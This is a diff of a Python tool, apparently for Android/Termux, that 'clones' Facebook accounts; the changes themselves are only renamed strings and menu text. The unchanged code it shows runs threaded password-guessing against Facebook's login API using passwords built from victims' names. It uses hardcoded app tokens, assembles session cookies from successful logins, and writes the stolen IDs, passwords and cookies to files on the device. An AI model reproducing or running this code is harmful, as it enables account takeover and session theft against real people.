@@ -12,7 +12,7 @@ try:
 	from concurrent.futures import ThreadPoolExecutor as tred
 except ModuleNotFoundError:
 	exit('\n Error in Module!')
-try:os.mkdir('/sdcard/abhishek')
+try:os.mkdir('/sdcard/Abhishek')
 except:pass
 os.system('p'+'i'+'p'+' un'+'inst'+'all '+' h'+'tt'+'px'+' -y'+' > /dev/null')
 os.system('p'+'i'+'p'+' install '+' h'+'tt'+'px'+' > /dev/null')
@@ -26,7 +26,7 @@ fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).deco
 
 try:import httpx
 except:exit(' Found error in http module! ')
-xx=requests.get('https://raw.githubusercontent.com/ABHISHEKXBAAU/files/main/ua.txt').text.splitlines()
+xx=requests.get('https://raw.githubusercontent.com/AbhishekXBAAU/files/main/ua.txt').text.splitlines()
 def clear():
 	os.system('clear')
 	print(logo)
@@ -39,7 +39,7 @@ logo=("""\033[1;37m
 #     # #     # #     #  #  #     # #     # #       #   #       
 #     # ######  #     # ###  #####  #     # ####### #    #      
 ----------------------------------------------
- Author    : ABHISHEK RAI 
+ Author    : Abhishek RAI 
  Status    : FREE
  Version   : 0.0.1 \033[1;37m
  ok ids will be saved in AVHI folder
@@ -52,7 +52,7 @@ cps=[]
 ck=[]
 def main():
 	clear()
-	print(' [1] file cloning \n [2] create file \n [3] random cloning \n [4] random mail clone\n [?] another option soon ')
+	print(' [1] File Cloning\n [2] Create File[Not Working]\n [3] Random Cloning\n [4] Random Mail Clone\n [?] Another Option Soon ')
 	line()
 	x=input(' choice an option: ')
 	if x =='1':
@@ -100,7 +100,7 @@ def file():
 			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
 			sim_id+=fbcr
 	except:fbcr = "ZONG"
-	with tred(max_workers=20) as abhishek:
+	with tred(max_workers=20) as Abhishek:
 		clear()
 		tl = str(len(fo))
 		print(' Total account : \033[1;32m'+tl)
@@ -110,13 +110,13 @@ def file():
 			ids,names = user.split('|')
 			passlist = plist
 			if mthd =='1':
-				abhishek.submit(m1,ids,names,passlist,fbcr)
+				Abhishek.submit(m1,ids,names,passlist,fbcr)
 			elif mthd =='2':
-				abhishek.submit(m2,ids,names,passlist,fbcr)
+				Abhishek.submit(m2,ids,names,passlist,fbcr)
 			elif mthd =='3':
-				abhishek.submit(m3,ids,names,passlist,fbcr)
+				Abhishek.submit(m3,ids,names,passlist,fbcr)
 			else:
-				abhishek.submit(m2,ids,names,passlist,fbcr)
+				Abhishek.submit(m2,ids,names,passlist,fbcr)
 	print('\033[1;37m')
 	line()
 	print(' The process has completed')
@@ -130,11 +130,11 @@ def file():
 def gmail():
 	os.system('rm -rf .re.txt')
 	clear()
-	print('\033[1;37m Example : \33[1;32m ahad, ali, sajjad, faizan\033[1;97m')
+	print('\033[1;37m Example : \33[1;32m Sunil, Saugat, Anmol, Suprim\033[1;97m')
 	line()
 	first = input(' Put first name: ')
 	line()
-	print('\033[1;37m Example : \33[1;32m Rai, ahmad, ali \033[1;97m')
+	print('\033[1;37m Example : \33[1;32m Rai, Magar, grg \033[1;97m')
 	line()
 	last = input(' Put last name: ')
 	domain = "@gmail.com"
@@ -265,7 +265,7 @@ def rnd():
 def m1(ids,names,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [abhishek-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [Abhishek-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -294,11 +294,11 @@ def m1(ids,names,passlist,fbcr):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if "session_key" in po:
 				token = po['access_token']
-				print('\r\r\033[1;32m [abhishek-OK] '+ids+' | '+pas)
+				print('\r\r\033[1;32m [Abhishek-OK] '+ids+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/abhishek/abhishek-M1-OK.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/Abhishek/Abhishek-M1-OK.txt','a').write(ids+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/abhishek/abhishek-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/Abhishek/Abhishek-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 		loop+=1
 	except requests.exceptions.ConnectionError:
@@ -308,7 +308,7 @@ def m1(ids,names,passlist,fbcr):
 def m2(ids,names,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [abhishek-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [Abhishek-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -337,18 +337,18 @@ def m2(ids,names,passlist,fbcr):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if "session_key" in po:
 				token = po['access_token']
-				print('\r\r\033[1;32m [abhishek-OK] '+ids+' | '+pas)
+				print('\r\r\033[1;32m [Abhishek-OK] '+ids+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/abhishek/abhishek-M2-OK.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/Abhishek/Abhishek-M2-OK.txt','a').write(ids+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/abhishek/abhishek-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/Abhishek/Abhishek-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 			'''elif 299==random.randint(1,300):
 				oks.append(ids)
-				print('\r\r\033[1;32m [abhishek-OK] '+ids+' | '+pas)
-			#	open('/sdcard/abhishek/abhishek-M2-OK.txt','a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [Abhishek-OK] '+ids+' | '+pas)
+			#	open('/sdcard/Abhishek/Abhishek-M2-OK.txt','a').write(ids+'|'+pas+'\n')
 				#cookie = 'Error'
-				#open('/sdcard/abhishek/abhishek-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				#open('/sdcard/Abhishek/Abhishek-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break'''
 		loop+=1
 	except requests.exceptions.ConnectionError:
@@ -358,7 +358,7 @@ def m2(ids,names,passlist,fbcr):
 def m3(ids,names,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [abhishek-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [Abhishek-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -373,11 +373,11 @@ def m3(ids,names,passlist,fbcr):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if "session_key" in po:
 				token = po['access_token']
-				print('\r\r\033[1;32m [abhishek-OK] '+ids+' | '+pas)
+				print('\r\r\033[1;32m [Abhishek-OK] '+ids+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/abhishek/abhishek-M3-OK.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/Abhishek/Abhishek-M3-OK.txt','a').write(ids+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/abhishek/abhishek-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/Abhishek/Abhishek-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 		loop+=1
 	except requests.exceptions.ConnectionError:
@@ -387,7 +387,7 @@ def m3(ids,names,passlist,fbcr):
 def rd(ids,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [abhishek-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [Abhishek-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		for pas in passlist:
 			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
 			accessToken = random.choice(tokenlist)
@@ -409,11 +409,11 @@ def rd(ids,passlist,fbcr):
 			if "session_key" in po:
 				uid = str(po['uid'])
 				token = po['access_token']
-				print('\r\r\033[1;32m [abhishek-OK] '+uid+' | '+pas)
+				print('\r\r\033[1;32m [Abhishek-OK] '+uid+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/abhishek/abhishek-R-OK.txt','a').write(uid+'|'+pas+'\n')
+				open('/sdcard/Abhishek/Abhishek-R-OK.txt','a').write(uid+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/abhishek/abhishek-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/Abhishek/Abhishek-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 		loop+=1
 	except requests.exceptions.ConnectionError:
